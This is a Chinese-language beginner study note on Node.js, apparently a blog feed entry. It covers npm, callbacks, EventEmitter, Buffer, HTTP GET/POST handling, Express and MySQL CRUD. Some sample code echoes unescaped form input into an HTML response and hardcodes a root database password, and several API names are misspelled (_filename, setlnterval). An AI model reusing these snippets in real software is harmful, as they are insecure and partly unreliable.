<li><a href="#%E4%B8%89-npm">三、npm</a>
<ul>
<li><a href="#1-npm%E4%BD%BF%E7%94%A8%E4%BB%8B%E7%BB%8D">1. npm使用介绍</a></li>
<li><a href="#2-npm%E5%AE%89%E8%A3%85%E6%A8%A1%E5%9D%97">2. npm安装模块</a></li>
<li><a href="#3-%E5%88%9B%E5%BB%BA%E6%A8%A1%E5%9D%97">3. 创建模块</a></li>
<li><a href="#4-%E5%85%B6%E4%BB%96npm">4. 其他npm</a></li>
</ul>
</li>
<li><a href="#%E5%9B%9B-repl%E4%BA%A4%E4%BA%92%E5%BC%8F%E8%A7%A3%E9%87%8A%E5%99%A8">四、REPL交互式解释器</a></li>
<li><a href="#%E4%BA%94-%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0%E4%B8%8E%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF">五、回调函数与事件循环</a>
<ul>
<li><a href="#1-%E5%9B%9E%E8%B0%83">1. 回调</a></li>
<li><a href="#2-%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF">2. 事件循环</a></li>
</ul>
</li>
<li><a href="#%E5%85%AD-eventemitter">六、EventEmitter</a>
<ul>
<li><a href="#error%E4%BA%8B%E4%BB%B6">error事件</a></li>
<li><a href="#%E7%BB%A7%E6%89%BF-eventemitter">继承 EventEmitter</a></li>
</ul>
</li>
<li><a href="#%E4%B8%83-buffer%E7%BC%93%E5%86%B2%E5%8C%BA">七、Buffer(缓冲区)</a>
<ul>
<li><a href="#buffer%E4%B8%8E%E5%AD%97%E7%AC%A6%E7%BC%96%E7%A0%81">Buffer与字符编码</a></li>
</ul>
</li>
<li><a href="#%E5%85%AB-%E6%A8%A1%E5%9D%97%E7%B3%BB%E7%BB%9F">八、模块系统</a></li>
<li><a href="#%E4%B9%9D-%E5%87%BD%E6%95%B0">九、函数</a></li>
<li><a href="#%E5%8D%81-%E8%B7%AF%E7%94%B1">十、路由</a></li>
<li><a href="#%E5%8D%81%E4%B8%80-%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F">十一、全局变量</a></li>
<li><a href="#%E5%8D%81%E4%BA%8C-%E6%96%87%E4%BB%B6-%E5%BC%82%E6%AD%A5">十二、文件-异步</a></li>
<li><a href="#%E5%8D%81%E4%B8%89-getpost%E8%AF%B7%E6%B1%82">十三、GET/POST请求</a></li>
<li><a href="#%E5%8D%81%E5%9B%9B-express%E6%A1%86%E6%9E%B6">十四、Express框架</a></li>
<li><a href="#%E5%8D%81%E4%BA%94-%E8%BF%9E%E6%8E%A5-mysql">十五、连接 MySQL</a>
<ul>
<li><a href="#%E5%AE%89%E8%A3%85%E9%A9%B1%E5%8A%A8">安装驱动</a></li>
<li><a href="#%E8%BF%9E%E6%8E%A5%E6%95%B0%E6%8D%AE%E5%BA%93">连接数据库</a></li>
<li><a href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C-curd">数据库操作( CURD )</a>
<ul>
<li><a href="#%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE">查询数据</a></li>
<li><a href="#%E6%8F%92%E5%85%A5%E6%95%B0%E6%8D%AE">插入数据</a></li>
<li><a href="#%E6%9B%B4%E6%96%B0%E6%95%B0%E6%8D%AE">更新数据</a></li>
<li><a href="#%E5%88%A0%E9%99%A4%E6%95%B0%E6%8D%AE">删除数据</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</p>
<h1 id="nodejs">nodejs</h1>
<ol>
<li>
<p>介绍：</p>
<p>简单的说 Node.js 就是运行在服务端的 JavaScript。</p>
<p>Node.js 是一个基于Chrome JavaScript 运行时建立的一个平台。</p>
<p>Node.js是一个事件驱动I/O服务端JavaScript环境，基于Google的V8引擎，V8引擎执行Javascript的速度非常快，性能非常好。</p>
<p>Node.js的作用类似于Apache，是建立一个可以运行JavaScript的服务端，JavaScript之于Node.js就像PHP之于Apache一样。</p>
</li>
</ol>
<h2 id="一-运行脚本">一、运行脚本</h2>
<p>目的：编写简单的一个脚本并运行 了解nodejs</p>
<pre><code>console.log(&quot;hello world!&quot;)
# 保存为helloworld.js文件
# 注意中间不能有任何的空格
</code></pre>
<p>终端到此目录，<code>node helloworld.js</code></p>
<p>查找命令node -h</p>
<p>在终端下输入node进入nodejs的命令模式（交互式解释器），有点类似于python。</p>
<h2 id="二-创建应用">二、创建应用</h2>
<p>使用php编写后端代码后 部署需要Apache或Nginx 并且要有mod_php和php_cgi才能成功解析php，从这点来看，整个&quot;接收 HTTP 请求并提供 Web 页面&quot;的需求就不需要 PHP 来处理。</p>
<p>nodejs不仅能充当上述服务器的作用 还能实现一个应用。</p>
<p>就上例而言 nodejs的应用由<strong>引入 required 模块</strong>、<strong>创建服务器</strong>、<strong>接收请求与响应请求</strong>这几部分组成。</p>
<h3 id="1-引入模块">1. 引入模块</h3>
<p>使用require载入http模块 把实例化的HTTP服务赋值给变量http 其中require是nodejs自带的http模块<br>
<code>var http = require(&quot;http&quot;);</code></p>
<h3 id="2-创建服务器">2. 创建服务器</h3>
<p>在http模块中提供一函数creatServer，函数会返回一个对象 可以通过listen的方法截获并绑定端口8888，在里面使用request和response来接收和响应数据</p>
<p>http.creatServe()方法创建服务器</p>
<pre><code>//httpserver.js
var http = require('http');

http.createServer(function(request,response){
    response.writeHead(200,{'Content-Type':'text/plain'});//http头 状态码 内容类型
    response.end(&quot;The js had been called!\n&quot;)
}).listen(8080)//监听8080端口

console.log('Server running at http://127.0.0.1:8080')
</code></pre>
<pre><code>//server.js
var http = require('http');

http.createServer(function (request, response) {

    // 发送 HTTP 头部 
    // HTTP 状态值: 200 : OK
    // 内容类型: text/plain
    response.writeHead(200, {'Content-Type': 'text/plain'});

    // 发送响应数据 &quot;Hello World&quot;
    response.end('Hello World\n');
}).listen(8888);

// 终端打印如下信息
console.log('Server running at http://127.0.0.1:8888/');
</code></pre>
<p>配合index.html</p>
<h2 id="三-npm">三、npm</h2>
<h3 id="1-npm使用介绍">1. npm使用介绍</h3>
<p>npm是nodejs(随同nodejs一起安装)的包管理工具，新版的nodejs已经带有npm，能解决NodeJS代码部署上的很多问题。</p>
<ul>
<li>允许用户从NPM服务器下载别人编写的第三方包到本地使用。</li>
<li>允许用户从NPM服务器下载并安装别人编写的命令行程序到本地使用。</li>
<li>允许用户将自己编写的包或命令行程序上传到NPM服务器供别人使用。</li>
</ul>
<p>但通常要升级<code>npm install npm -g(全局安装)</code><br>
也需要配置镜像<code>npm install -g cnpm --registry=https://registry.npm.taobao.org</code></p>
<h3 id="2-npm安装模块">2. npm安装模块</h3>
<figure data-type="image" tabindex="1"><img src="https://gitee.com/qu-xiaolei001/pic/raw/master/img/QQ%E6%88%AA%E5%9B%BE20210504213826.png" alt="QQ截图20210504213826" loading="lazy"></figure>
<p>安装模块分为本地安装和全局安装</p>
<ul>
<li>
<p>本地安装（npm install express ）</p>
<ol>
<li>将安装包放在 ./node_modules 下（运行 npm 命令时所在的目录），如果没有 node_modules 目录，会在当前执行 npm 命令的目录下生成 node_modules 目录。</li>
<li>可以通过 require() 来引入本地安装的包。</li>
</ol>
</li>
<li>
<p>全局安装（npm install express -g）</p>
<ol>
<li>将安装包放在 /usr/local 下或者你 node 的安装目录。</li>
<li>可以直接在命令行里使用。</li>
</ol>
</li>
<li>
<p>如果你希望具备两者功能，则需要在两个地方安装它或使用 <strong>npm link</strong>。安装过程输出内容，第一行输出了模块的版本号及安装位置。</p>
</li>
<li>
<p>如果安装出现错误：npm err! Error: connect ECONNREFUSED 127.0.0.1:8087</p>
<pre><code>npm config set proxy null
</code></pre>
</li>
</ul>
<p>本地安装<code>npm install npm</code><br>
全局安装<code>npm install npm -g</code><br>
卸载模块<code>npm uninstall npm</code><br>
查看安装的模块包<code>npm ls</code><br>
升级或更新模块<code>npm update npm</code><br>
查看所有全局安装的模块的安装信息<code>npm list -g</code><br>
查看模块版本号<code>npm list grunt</code><br>
搜索模块<code>npm search npm</code></p>
<h3 id="3-创建模块">3. 创建模块</h3>
<p>首先来看一个包的json 位于node_modules/npm的package.json的属性说明</p>
<pre><code>name - 包名。

version - 包的版本号。

description - 包的描述。

homepage - 包的官网 url 。

author - 包的作者姓名。

contributors - 包的其他贡献者姓名。

dependencies - 依赖包列表。如果依赖包没有安装，npm 会自动将依赖包安装在 node_module 目录下。

repository - 包代码存放的地方的类型，可以是 git 或 svn，git 可在 Github 上。

main - main 字段指定了程序的主入口文件，require('moduleName') 就会加载这个文件。这个字段的默认值是模块根目录下面的 index.js。

keywords - 关键字
</code></pre>
<p>npm init(目录下无package.json 否则会修改当前的package.json文件)</p>
<p>信息需要自己输入，可参考菜鸟教程</p>
<figure data-type="image" tabindex="2"><img src="https://gitee.com/qu-xiaolei001/pic/raw/master/img/npminit.png" alt="" loading="lazy"></figure>
<p>接着使用npm来发布模块(不演示)</p>
<ul class="contains-task-list">
<li class="task-list-item">
<p><input class="task-list-item-checkbox" disabled="" type="checkbox" id="task-item-7981998"> 首先在npm资源库注册用户<label class="task-list-item-label" for="task-item-7981998"> 首先在npm资源库注册用户``npm adduser``</label></p>
<pre><code>$ npm adduser
Username: mcmohd
Password:
Email: (this IS public) mcmohd@gmail.com
</code></pre>
</li>
<li class="task-list-item">
<p><input class="task-list-item-checkbox" disabled="" type="checkbox" id="task-item-2548695"> 之后可以发布模块<label class="task-list-item-label" for="task-item-2548695"> 之后可以发布模块``npm publish``</label></p>
<pre><code>$ npm publish
</code></pre>
</li>
</ul>
<h3 id="4-其他npm">4. 其他npm</h3>
<figure data-type="image" tabindex="3"><img src="https://gitee.com/qu-xiaolei001/pic/raw/master/img/QQ%E6%88%AA%E5%9B%BE20210505140452-1620194789830.png" alt="QQ截图20210505140452" loading="lazy"></figure>
<h2 id="四-repl交互式解释器">四、REPL交互式解释器</h2>
<p>终端下输入node来启动node的终端，启动之后如下图。</p>
<figure data-type="image" tabindex="4"><img src="https://gitee.com/qu-xiaolei001/pic/raw/master/img/PERl.png" alt="" loading="lazy"></figure>
<p>REPL作用：</p>
<ul>
<li><strong>读取</strong> - 读取用户输入，解析输入的 Javascript 数据结构并存储在内存中。</li>
<li><strong>执行</strong> - 执行输入的数据结构</li>
<li><strong>打印</strong> - 输出结果</li>
<li><strong>循环</strong> - 循环操作以上步骤直到用户两次按下 <strong>ctrl-c</strong> 按钮退出。</li>
<li><strong>调试</strong> - 交互式解释器可以很好的调试 Javascript 代码。</li>
</ul>
<p>（表达式计算，使用变量，多行表达式，下划线(_)变量）</p>
<pre><code>   1. 可以不声明变量 但会直接计算结果并输出。
   2. 可以将数据储存在变量中，使用var关键字声明变量，不使用则会被直接打印，使用 **var** 关键字的变量可以使用 console.log() 来输出变量。
   3. 可以使用{}来进行一个多行的表达式，类似于函数，循环等等。
   4. 可以使用下划线(_)获取上一个表达式的运算结果。
</code></pre>
<p>​    node中ctrl+c一次退出当前 两次退出解释器 ctrl+d直接退出解释器。</p>
<figure data-type="image" tabindex="5"><img src="https://gitee.com/qu-xiaolei001/pic/raw/master/img/QQ%E6%88%AA%E5%9B%BE20210505142446.png" alt="" loading="lazy"></figure>
<h2 id="五-回调函数与事件循环">五、回调函数与事件循环</h2>
<h3 id="1-回调">1. 回调</h3>
<p>先来看两个例子</p>
<ul>
<li>阻塞 1.js</li>
</ul>
<p><code>var data = fs.readFileSync('input.txt');</code></p>
<p>读取完文件 执行程序</p>
<ul>
<li>非阻塞 2.js</li>
</ul>
<pre><code>fs.readFile('input.txt', function (err, data) {
    if (err) return console.error(err);
    console.log(data.toString());
});
</code></pre>
<p>以上程序中 fs.readFile() 是异步函数用于读取文件。 如果在读取文件过程中发生错误，错误 err 对象就会输出错误信息。如果没发生错误，readFile 跳过 err 对象的输出，文件内容就通过回调函数输出。</p>
<p>读取文件的同时执行后面的代码 因此提高了程序的性能 从而我们可以把需要处理回调函数的参数写在回调函数内</p>
<p>即 ：阻塞是按顺序执行代码的 非阻塞可以不按照顺序执行</p>
<h3 id="2-事件循环">2. 事件循环</h3>
<p>Node.js 异步编程的直接体现就是回调。</p>
<p>异步编程依托于回调来实现 但不能说使用了回调后程序就异步化了。</p>
<p>nodejs是单线程应用程序 而V8引擎提供的异步执行回调接口就可以处理大量的并发 从而极大的提升了性能。</p>
<p>nodejs的几乎每个API接口都支持回调函数 所有事件均是上帝视角 当事件被检测到就会触发回调函数 。<br>
Node.js 使用事件驱动模型，webserver一直接收请求而不等待读写操作（非阻塞式IO或事件驱动IO） 然后去服务下一个web请求 当这个请求完成 它被放回处理队列 当到达队列开头 这个结果被返回给用户 这种模型非常高效可扩展性也非常强。<br>
<img src="https://gitee.com/qu-xiaolei001/pic/raw/master/img/event_loop.jpg" alt="" loading="lazy"></p>
<p>回到开头的引言 我们了解了回调函数以及事件循环 就能执行异步操作了<br>
下面是 将执行异步操作的函数写在回调函数的最后一个参数中 回调函数接收错误对象则作为第一个参数</p>
<p>执行3.js-&gt;删除input.txt-&gt;执行3.js</p>
<pre><code>var fs = require(&quot;fs&quot;);

fs.readFile('input.txt', function (err, data) {
   if (err){
      console.log(err.stack);
      return;
   }
   console.log(data.toString());
});
console.log(&quot;程序执行完毕&quot;);
</code></pre>
<p>readFile函数读取文件，如果在读取文件过程中发生错误，错误 err 对象就会输出错误信息。<br>
如果没发生错误，readFile 跳过 err 对象的输出，文件内容就通过回调函数输出，此时就是一次异步操作。</p>
<h2 id="六-eventemitter">六、EventEmitter</h2>
<p>events模块只提供一个对象：events.EventEmitter，EventEnitter的核心是事件触发和事件监听的封装。EventEmitter对象中有多个属性on绑定事件函数 emit属性触发事件</p>
<ol>
<li>可以通过require(&quot;events&quot;);来访问该模块。</li>
</ol>
<pre><code>// 引入 events 模块
var events = require('events');
// 创建 eventEmitter 对象
var eventEmitter = new events.EventEmitter();
</code></pre>
<ol start="2">
<li>
<p>EventEmitter 对象如果在实例化时发生错误，会触发 error 事件。当添加新的监听器时，newListener 事件会触发，当监听器被移除时，removeListener 事件被触发。</p>
<p>下面我们用一个简单的例子说明 EventEmitter 的用法：</p>
</li>
</ol>
<pre><code>//event.js 文件
var EventEmitter = require('events').EventEmitter; 
var event = new EventEmitter(); 
event.on('some_event', function() { 
    console.log('some_event 事件触发'); 
}); 
setTimeout(function() { 
    event.emit('some_event'); 
}, 1000); 
</code></pre>
<p>​	执行结果如下：</p>
<p>​	运行这段代码，1 秒后控制台输出了 <strong>'some_event 事件触发'</strong>。其原理是 event 对象注册了事件 some_event 的一个监听器，然后我们通过 setTimeout 在 1000 毫秒以后向 event 对象发送事件 some_event，此时会调用some_event 的监听器。</p>
<p>EventEmitter 的每个事件由一个事件名和若干个参数组成，事件名是一个字符串，通常表达一定的语义。对于每个事件，EventEmitter 支持 若干个事件监听器。</p>
<p>当事件触发时，注册到这个事件的事件监听器被依次调用，事件参数作为回调函数参数传递。</p>
<figure data-type="image" tabindex="6"><img src="https://gitee.com/qu-xiaolei001/pic/raw/master/img/EventEmitter.png" alt="" loading="lazy"></figure>
<h3 id="error事件">error事件</h3>
<p>​	EventEmitter 定义了一个特殊的事件 error，它包含了错误的语义，我们在遇到 异常的时候通常会触发 error 事件。</p>
<p>​	当 error 被触发时，EventEmitter 规定如果没有响 应的监听器，Node.js 会把它当作异常，退出程序并输出错误信息。</p>
<p>​	我们一般要为会触发 error 事件的对象设置监听器，避免遇到错误后整个程序崩溃。</p>
<p>​	一个事件发生错误时没有监听器时会报错 一般要对其设置error事件的监听器。</p>
<h3 id="继承-eventemitter">继承 EventEmitter</h3>
<p>大多数时候我们不会直接使用 EventEmitter，而是在对象中继承它。包括 fs、net、 http 在内的，只要是支持事件响应的核心模块都是 EventEmitter 的子类。</p>
<p>为什么要这样做呢？原因有两点：</p>
<p>首先，具有某个实体功能的对象实现事件符合语义， 事件的监听和发生应该是一个对象的方法。</p>
<p>其次 JavaScript 的对象机制是基于原型的，支持 部分多重继承，继承 EventEmitter 不会打乱对象原有的继承关系。</p>
<h2 id="七-buffer缓冲区">七、Buffer(缓冲区)</h2>
<p>JavaScript 语言自身只有字符串数据类型，没有二进制数据类型。</p>
<p>但在处理像TCP流或文件流时，必须使用到二进制数据。因此在 Node.js中，定义了一个 Buffer 类，该类用来创建一个专门存放二进制数据的缓存区。</p>
<p>在 Node.js 中，Buffer 类是随 Node 内核一起发布的核心库。Buffer 库为 Node.js  带来了一种存储原始数据的方法，可以让 Node.js 处理二进制数据，每当需要在 Node.js 中处理I/O操作中移动的数据时，就有可能使用  Buffer 库。原始数据存储在 Buffer 类的实例中。一个 Buffer 类似于一个整数数组，但它对应于 V8 堆内存之外的一块原始内存。</p>
<h3 id="buffer与字符编码">Buffer与字符编码</h3>
<p>​	Buffer 实例一般用于表示编码字符的序列，比如 UTF-8 、 UCS2 、 Base64 、或十六进制编码的数据。 通过使用显式的字符编码，就可以在 Buffer 实例与普通的 JavaScript 字符串之间进行相互转换。</p>
<pre><code>const buf = Buffer.from('runoob', 'ascii');

// 输出 72756e6f6f62
console.log(buf.toString('hex'));

// 输出 cnVub29i
console.log(buf.toString('base64'))
</code></pre>
<figure data-type="image" tabindex="7"><img src="https://gitee.com/qu-xiaolei001/pic/raw/master/img/QQ%E6%88%AA%E5%9B%BE20210505155516.png" alt="QQ截图20210505155516" loading="lazy"></figure>
<p>创建Buffer类</p>
<blockquote>
<p>Buffer.alloc(size[, fill[, encoding]])： 返回一个指定大小的 Buffer 实例，如果没有设置 fill，则默认填满 0</p>
<p>Buffer.allocUnsafe(size)： 返回一个指定大小的 Buffer 实例，但是它不会被初始化，所以它可能包含敏感的数据</p>
<p>Buffer.allocUnsafeSlow(size)</p>
<p>Buffer.from(array)： 返回一个被 array 的值初始化的新的 Buffer 实例（传入的 array 的元素只能是数字，不然就会自动被 0 覆盖）</p>
<p>Buffer.from(arrayBuffer[, byteOffset[, length]])： 返回一个新建的与给定的 ArrayBuffer 共享同一内存的 Buffer。</p>
<p>Buffer.from(buffer)： 复制传入的 Buffer 实例的数据，并返回一个新的 Buffer 实例</p>
<p>Buffer.from(string[, encoding])： 返回一个被 string 的值初始化的新的 Buffer 实例</p>
</blockquote>
<p>写入缓冲区</p>
<blockquote>
<p>buf.write(string[, offset[, length]][, encoding])</p>
</blockquote>
<p>从缓冲区读取</p>
<blockquote>
<p>buf.toString([encoding[, start[, end]]])</p>
</blockquote>
<p>将buffer转换为json对象</p>
<blockquote>
<p>buf.toJSON()</p>
</blockquote>
<p>合并缓冲区</p>
<blockquote>
<p>Buffer.concat(list[, totalLength])</p>
</blockquote>
<p>比较缓冲区</p>
<blockquote>
<p>buf.compare(otherBuffer);</p>
</blockquote>
<p>拷贝缓冲区</p>
<blockquote>
<p>buf.copy(targetBuffer[, targetStart[, sourceStart[, sourceEnd]]])</p>
</blockquote>
<p>裁剪缓冲区</p>
<blockquote>
<p>buf.slice([start[, end]])</p>
</blockquote>
<p>计算缓冲区长度</p>
<blockquote>
<p>buf.length;</p>
</blockquote>
<h2 id="八-模块系统">八、模块系统</h2>
<p>前面介绍过了 引入模块使用require+模块文件<br>
<img src="D:%5CPicGo%5Cimage%5Crequire.jpg" alt="" loading="lazy"><br>
require接收http、fs等原生模块以及某路径下的文件模块，还有mod非原生模块</p>
<h2 id="九-函数">九、函数</h2>
<pre><code>function say(word) {
  console.log(word);
}

function execute(someFunction, value) {
  someFunction(value);
}

execute(say, &quot;Hello&quot;);
</code></pre>
<p>say是一个函数 execute函数的第一个参数就是say本身(不是它的返回值) 而say中有一个参数 所以用本地变量someFunction来传递变量</p>
<ul>
<li>匿名函数<br>
一般我们函数使用是先声明后定义使用<br>
即使我们不急着定义函数体 但在对应域前必须声明了 我们才能调用 而这我们可在函数体内——在参数表中使用本地变量someFunction 在函数体内直接使用 甚至都不用给函数名字</li>
</ul>
<pre><code>function execute(someFunction, value) {
  someFunction(value);
}

execute(function(word){ console.log(word) }, &quot;Hello&quot;);
</code></pre>
<h2 id="十-路由">十、路由</h2>
<p>url请求 GET POSt参数在前面搭建简单应用时没有提及 作为后端处理这些请求就要有相应的服务器的功能<br>
router下有个index.js文件 里面可以设置数据库 引入其他模块 同样可以写一个服务的serve.js 引入http url等模块 启动后充当服务器<br>
然后用到一个router.js的文件 写一个路由函数作为参数传给server.js<br>
至此可以访问url</p>
<h2 id="十一-全局变量">十一、全局变量</h2>
<p>列出一丢丢：</p>
<p>_filename 当前脚本文件名 输出其绝对路径</p>
<p>_dirname 当前脚本所在路径</p>
<p>setTimeour(function(),ms) 全局函数 在指定毫秒后执行一次函数</p>
<p>clearTimeout(t) 清除setTimeout()</p>
<pre><code>function printHello(){
   console.log( &quot;Hello, World!&quot;);
}
// 两秒后执行以上函数
var t = setTimeout(printHello, 2000);

// 清除定时器
clearTimeout(t);
</code></pre>
<p>setlnterval(function(),ms)<br>
clearlnterval(t)<br>
和上面的两个一样 不同的是 setlntercal会一直调用函数 直至clearlnterval调用或窗口关闭</p>
<p>process是global的属性 也是全局变量有四个事件<br>
exit before uncaughException Signal</p>
<h2 id="十二-文件-异步">十二、文件-异步</h2>
<p>导入文件系统模块<br>
<code>var fs = require(&quot;fs&quot;)</code></p>
<ul>
<li>读取input.txt</li>
</ul>
<pre><code>fs.readFile('input.txt', function (err, data) {
   if (err) {
       return console.error(err);
   }
   console.log(&quot;异步读取: &quot; + data.toString());
});
</code></pre>
<p>类似地有函数：</p>
<pre><code>打开
fs.open(path, flags[, mode], callback)//(flags:r r+ a a+ ......)

写入
fs.writeFile(file, data[, options], callback)

读取
fs.read(fd, buffer, offset, length, position, callback)

关闭
fs.close(fd, callback)

删除 
fs.unlink(path, callback)

还有目录...
</code></pre>
<h2 id="十三-getpost请求">十三、GET/POST请求</h2>
<p>获取get请求的参数</p>
<pre><code>var http = require('http');
var url = require('url');
var util = require('util');
 
http.createServer(function(req, res){
    res.writeHead(200, {'Content-Type': 'text/plain; charset=utf-8'});
    res.end(util.inspect(url.parse(req.url, true)));
}).listen(3000);
</code></pre>
<p>获取url的参数</p>
<pre><code>var http = require('http');
var url = require('url');
var util = require('util');
 
http.createServer(function(req, res){
    res.writeHead(200, {'Content-Type': 'text/plain'});
 
    // 解析 url 参数
    var params = url.parse(req.url, true).query;
    res.write(&quot;网站名：&quot; + params.name);
    res.write(&quot;\n&quot;);
    res.write(&quot;网站 URL：&quot; + params.url);
    res.end();
 
}).listen(3000);
</code></pre>
<p>获取post的内容</p>
<pre><code>var http = require('http');
var querystring = require('querystring');
var util = require('util');
 
http.createServer(function(req, res){
    // 定义了一个post变量，用于暂存请求体的信息
    var post = '';     
 
    // 通过req的data事件监听函数，每当接受到请求体的数据，就累加到post变量中
    req.on('data', function(chunk){    
        post += chunk;
    });
 
    // 在end事件触发后，通过querystring.parse将post解析为真正的POST请求格式，然后向客户端返回。
    req.on('end', function(){    
        post = querystring.parse(post);
        res.end(util.inspect(post));
    });
}).listen(3000);
</code></pre>
<p>提交post表单</p>
<pre><code>var http = require('http');
var querystring = require('querystring');
 
var postHTML = 
  '&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;Node.js 实例&lt;/title&gt;&lt;/head&gt;' +
  '&lt;body&gt;' +
  '&lt;form method=&quot;post&quot;&gt;' +
  '网站名： &lt;input name=&quot;name&quot;&gt;&lt;br&gt;' +
  '网站 URL： &lt;input name=&quot;url&quot;&gt;&lt;br&gt;' +
  '&lt;input type=&quot;submit&quot;&gt;' +
  '&lt;/form&gt;' +
  '&lt;/body&gt;&lt;/html&gt;';
 
http.createServer(function (req, res) {
  var body = &quot;&quot;;
  req.on('data', function (chunk) {
    body += chunk;
  });
  req.on('end', function () {
    // 解析参数
    body = querystring.parse(body);
    // 设置响应头部信息及编码
    res.writeHead(200, {'Content-Type': 'text/html; charset=utf8'});
 
    if(body.name &amp;&amp; body.url) { // 输出提交的数据
        res.write(&quot;网站名：&quot; + body.name);
        res.write(&quot;&lt;br&gt;&quot;);
        res.write(&quot;网站 URL：&quot; + body.url);
    } else {  // 输出表单
        res.write(postHTML);
    }
    res.end();
  });
}).listen(3000);
</code></pre>
<h2 id="十四-express框架">十四、Express框架</h2>
<p>利用Express框架<br>
实现GEt方法提交两个参数和POST方法提交两个参数<br>
完成文件上传 要本地安装multer模块  在目录下能看到上传的文件<br>
对cookie进行管理  要本地安装cookie-parser模块 在服务终端能看到cookie信息</p>
<h2 id="十五-连接-mysql">十五、连接 MySQL</h2>
<p>介绍如何使用 Node.js 来连接 MySQL，并对数据库进行操作。</p>
<h3 id="安装驱动">安装驱动</h3>
<p>本教程使用了<a href="https://www.runoob.com/nodejs/nodejs-npm.html#taobaonpm">淘宝定制的 cnpm 命令</a>进行安装：</p>
<pre><code>$ cnpm install mysql
</code></pre>
<h3 id="连接数据库">连接数据库</h3>
<p>在以下实例中根据你的实际配置修改数据库用户名、及密码及数据库名：</p>
<p>test.js 文件代码：</p>
<pre><code class="language-javascript">var mysql      = require('mysql');
var connection = mysql.createConnection({
  host     : 'localhost',
  user     : 'root',
  password : '123456',
  database : 'test'
});
 
connection.connect();
 
connection.query('SELECT 1 + 1 AS solution', function (error, results, fields) {
  if (error) throw error;
  console.log('The solution is: ', results[0].solution);
});
</code></pre>
<p>执行以下命令输出结果为：</p>
<p>$ node test.js<br>
The solution is: 2</p>
<h3 id="数据库操作-curd">数据库操作( CURD )</h3>
<p>在进行数据库操作前，你需要将本站提供的 Websites 表 SQL 文件<a href="https://static.runoob.com/download/websites.sql">websites.sql</a> 导入到你的 MySQL 数据库中。</p>
<p>本教程测试的 MySQL 用户名为 root，密码为 123456，数据库为 test，你需要根据自己配置情况修改。</p>
<h4 id="查询数据">查询数据</h4>
<p>将上面我们提供的 SQL 文件导入数据库后，执行以下代码即可查询出数据：</p>
<p>查询数据</p>
<pre><code class="language-javascript">var mysql  = require('mysql');  
 
var connection = mysql.createConnection({     
  host     : 'localhost',       
  user     : 'root',              
  password : '123456',       
  port: '3306',                   
  database: 'test' 
}); 
 
connection.connect();
 
var  sql = 'SELECT * FROM websites';
//查
connection.query(sql,function (err, result) {
        if(err){
          console.log('[SELECT ERROR] - ',err.message);
          return;
        }
 
       console.log('------SELECT------');
       console.log(result);
       console.log('------------------');  
});
 
connection.end();
</code></pre>
<p>执行以下命令输出就结果为：</p>
<pre><code>$ node test.js
--------------------------SELECT----------------------------
[ RowDataPacket {
    id: 1,
    name: 'Google',
    url: 'https://www.google.cm/',
    alexa: 1,
    country: 'USA' },
  RowDataPacket {
    id: 2,
    name: '淘宝',
    url: 'https://www.taobao.com/',
    alexa: 13,
    country: 'CN' }
]
------------------------------------------------------------
</code></pre>
<h4 id="插入数据">插入数据</h4>
<p>我们可以向数据表 websties 插入数据：</p>
<p>插入数据</p>
<pre><code class="language-javascript">var mysql  = require('mysql');  
 
var connection = mysql.createConnection({     
  host     : 'localhost',       
  user     : 'root',              
  password : '123456',       
  port: '3306',                   
  database: 'test' 
}); 
 
connection.connect();
 
var  addSql = 'INSERT INTO websites(Id,name,url,alexa,country) VALUES(0,?,?,?,?)';
var  addSqlParams = ['工具', 'https://c.sxb.com','23453', 'CN'];
//增
connection.query(addSql,addSqlParams,function (err, result) {
        if(err){
         console.log('[INSERT ERROR] - ',err.message);
         return;
        }        
 
       console.log('------INSERT------');
       //console.log('INSERT ID:',result.insertId);        
       console.log('INSERT ID:',result);        
       console.log('--------------\n\n');  
});
 
connection.end();
</code></pre>
<p>执行以下命令输出就结果为：</p>
<pre><code>$ node test.js
--------------------------INSERT----------------------------
INSERT ID: OkPacket {
  fieldCount: 0,
  affectedRows: 1,
  insertId: 6,
  serverStatus: 2,
  warningCount: 0,
  message: '',
  protocol41: true,
  changedRows: 0 }
-----------------------------------------------------------------
</code></pre>
<p>执行成功后，查看数据表，即可以看到添加的数据</p>
<h4 id="更新数据">更新数据</h4>
<p>我们也可以对数据库的数据进行修改：</p>
<p>更新数据</p>
<pre><code class="language-javascript">var mysql  = require('mysql');  
 
var connection = mysql.createConnection({     
  host     : 'localhost',       
  user     : 'root',              
  password : '123456',       
  port: '3306',                   
  database: 'test' 
}); 
 
connection.connect();
 
var modSql = 'UPDATE websites SET name = ?,url = ? WHERE Id = ?';
var modSqlParams = ['移动站', 'https://m.sxt.com',6];
//改
connection.query(modSql,modSqlParams,function (err, result) {
   if(err){
         console.log('[UPDATE ERROR] - ',err.message);
         return;
   }        
  console.log('--------UPDATE--------');
  console.log('UPDATE affectedRows',result.affectedRows);
  console.log('----------\n\n');
});
 
connection.end();
</code></pre>
<p>执行以下命令输出就结果为：</p>
<pre><code>--------------------------UPDATE----------------------------
UPDATE affectedRows 1
-----------------------------------------------------------------
</code></pre>
<p>执行成功后，查看数据表</p>
<h4 id="删除数据">删除数据</h4>
<p>我们可以使用以下代码来删除 id 为 6 的数据:</p>
<p>删除数据</p>
<pre><code class="language-javascript">var mysql  = require('mysql');  
 
var connection = mysql.createConnection({     
  host     : 'localhost',       
  user     : 'root',              
  password : '123456',       
  port: '3306',                   
  database: 'test' 
}); 
 
connection.connect();
 
var delSql = 'DELETE FROM websites where id=6';
//删
connection.query(delSql,function (err, result) {
        if(err){
          console.log('[DELETE ERROR] - ',err.message);
          return;
        }        
 
       console.log('-----DELETE-------');
       console.log('DELETE affectedRows',result.affectedRows);
       console.log('----------------\n\n');  
});
 
connection.end();
</code></pre>
<p>执行以下命令输出就结果为：</p>
<pre><code>--------------------------DELETE----------------------------
DELETE affectedRows 1
-----------------------------------------------------------------
</code></pre>
<p>执行成功后，查看数据表</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[# KALI 主动信息收集]]></title>
        <id>https://kite-007.github.io/kali-zhu-dong-xin-xi-shou-ji/</id>
